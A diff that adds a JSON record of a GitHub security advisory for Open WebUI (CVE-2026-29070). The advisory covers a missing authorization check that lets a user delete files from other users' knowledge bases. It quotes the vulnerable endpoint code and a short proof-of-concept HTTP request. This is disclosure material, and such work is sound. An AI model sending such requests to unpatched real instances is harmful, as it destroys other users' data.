@@ -1,0 +1,97 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-29070",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.4,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "description": "### Summary\nAn access control check is missing when deleting a file from a knowledge base. The only check being done is that the user has write access to the knowledge base (or is admin), but NOT that the file actually belongs to this knowledge base. It is thus possible to delete arbitrary files from arbitrary knowledge bases (as long as one knows the file id)\n\n### Details\nThe source code at https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803 does not properly validate that the file being deleted belongs to the current knowledge base:\n```\n@router.post(\"/{id}/file/remove\", response_model=Optional[KnowledgeFilesResponse])\ndef remove_file_from_knowledge_by_id(\n    id: str,\n    form_data: KnowledgeFileIdForm,\n    delete_file: bool = Query(True),\n    user=Depends(get_verified_user),\n    db: Session = Depends(get_session),\n):\n    knowledge = Knowledges.get_knowledge_by_id(id=id, db=db)\n    [...]\n    # Note  : Access control check on the knowledge base\n    if (\n        knowledge.user_id != user.id\n        and not AccessGrants.has_access(\n            user_id=user.id,\n            resource_type=\"knowledge\",\n            resource_id=knowledge.id,\n            permission=\"write\",\n            db=db,\n        )\n        and user.role != \"admin\"\n    ):\n        raise HTTPException(\n            status_code=status.HTTP_400_BAD_REQUEST,\n            detail=ERROR_MESSAGES.ACCESS_PROHIBITED,\n        )\n\n    file = Files.get_file_by_id(form_data.file_id, db=db)\n    [...]\n    # Note : No checks on the file\n\n    if delete_file:\n        try:\n            # Remove the file's collection from vector database\n            file_collection = f\"file-{form_data.file_id}\"\n            if VECTOR_DB_CLIENT.has_collection(collection_name=file_collection):\n                VECTOR_DB_CLIENT.delete_collection(collection_name=file_collection)\n        except Exception as e:\n            log.debug(\"This was most likely caused by bypassing embedding processing\")\n            log.debug(e)\n            pass\n\n        # Delete file from database\n        Files.delete_file_by_id(form_data.file_id, db=db)\n[...]\n```\n\n### PoC\nVictim has a knowledge base with a file (id: 9db6dcee-bb3b-483e-aaf3-310fda366af1)\nAttacker creates their own collection (id: dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b)\nAttacker deletes the victim file from their own collection:\n```\nPOST /api/v1/knowledge/dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b/file/remove HTTP/1.1\nHost: gaius-neo-val.fr.space.corp\nAuthorization: Bearer eyJhbGciOiJIUzI1[...]nHiaod-3vfNE0\n[...]\n\n{\"file_id\":\"9db6dcee-bb3b-483e-aaf3-310fda366af1\"}\n\n-----\n\nHTTP/1.1 200 OK\n[...]\n```\nThe file is then deleted from the victim's knowledge base.\n\n\n### Impact\nArbitrary file deletion",
+    "ghsa_id": "GHSA-26gm-93rw-cchf",
+    "html_url": "https://github.com/advisories/GHSA-26gm-93rw-cchf",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-26gm-93rw-cchf"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-29070"
+      }
+    ],
+    "published_at": "2026-03-27T15:35:19Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-26gm-93rw-cchf",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-29070",
+      "https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803",
+      "https://github.com/advisories/GHSA-26gm-93rw-cchf"
+    ],
+    "severity": "medium",
+    "summary": "Open WebUI has unauthorized deletion of knowledge files",
+    "updated_at": "2026-03-27T15:35:23Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.8.6",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "< 0.8.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-26gm-93rw-cchf",
+  "repo": {
+    "cve_id": "CVE-2026-29070",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.4,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "### Summary\r\nAn access control check is missing when deleting a file from a knowledge base. The only check being done is that the user has write access to the knowledge base (or is admin), but NOT that the file actually belongs to this knowledge base. It is thus possible to delete arbitrary files from arbitrary knowledge bases (as long as one knows the file id)\r\n\r\n### Details\r\nThe source code at https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803 does not properly validate that the file being deleted belongs to the current knowledge base:\r\n```\r\n@router.post(\"/{id}/file/remove\", response_model=Optional[KnowledgeFilesResponse])\r\ndef remove_file_from_knowledge_by_id(\r\n    id: str,\r\n    form_data: KnowledgeFileIdForm,\r\n    delete_file: bool = Query(True),\r\n    user=Depends(get_verified_user),\r\n    db: Session = Depends(get_session),\r\n):\r\n    knowledge = Knowledges.get_knowledge_by_id(id=id, db=db)\r\n    [...]\r\n    # Note  : Access control check on the knowledge base\r\n    if (\r\n        knowledge.user_id != user.id\r\n        and not AccessGrants.has_access(\r\n            user_id=user.id,\r\n            resource_type=\"knowledge\",\r\n            resource_id=knowledge.id,\r\n            permission=\"write\",\r\n            db=db,\r\n        )\r\n        and user.role != \"admin\"\r\n    ):\r\n        raise HTTPException(\r\n            status_code=status.HTTP_400_BAD_REQUEST,\r\n            detail=ERROR_MESSAGES.ACCESS_PROHIBITED,\r\n        )\r\n\r\n    file = Files.get_file_by_id(form_data.file_id, db=db)\r\n    [...]\r\n    # Note : No checks on the file\r\n\r\n    if delete_file:\r\n        try:\r\n            # Remove the file's collection from vector database\r\n            file_collection = f\"file-{form_data.file_id}\"\r\n            if VECTOR_DB_CLIENT.has_collection(collection_name=file_collection):\r\n                VECTOR_DB_CLIENT.delete_collection(collection_name=file_collection)\r\n        except Exception as e:\r\n            log.debug(\"This was most likely caused by bypassing embedding processing\")\r\n            log.debug(e)\r\n            pass\r\n\r\n        # Delete file from database\r\n        Files.delete_file_by_id(form_data.file_id, db=db)\r\n[...]\r\n```\r\n\r\n### PoC\r\nVictim has a knowledge base with a file (id: 9db6dcee-bb3b-483e-aaf3-310fda366af1)\r\nAttacker creates their own collection (id: dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b)\r\nAttacker deletes the victim file from their own collection:\r\n```\r\nPOST /api/v1/knowledge/dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b/file/remove HTTP/1.1\r\nHost: gaius-neo-val.fr.space.corp\r\nAuthorization: Bearer eyJhbGciOiJIUzI1[...]nHiaod-3vfNE0\r\n[...]\r\n\r\n{\"file_id\":\"9db6dcee-bb3b-483e-aaf3-310fda366af1\"}\r\n\r\n-----\r\n\r\nHTTP/1.1 200 OK\r\n[...]\r\n```\r\nThe file is then deleted from the victim's knowledge base.\r\n\r\n\r\n### Impact\r\nArbitrary file deletion\r\n",
+    "ghsa_id": "GHSA-26gm-93rw-cchf",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-26gm-93rw-cchf",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-26gm-93rw-cchf"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-29070"
+      }
+    ],
+    "published_at": "2026-03-26T23:27:54Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Unauthorized deletion of knowledge files",
+    "updated_at": "2026-03-26T23:27:54Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": ">=0.8.6",
+        "vulnerable_version_range": "<=0.8.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
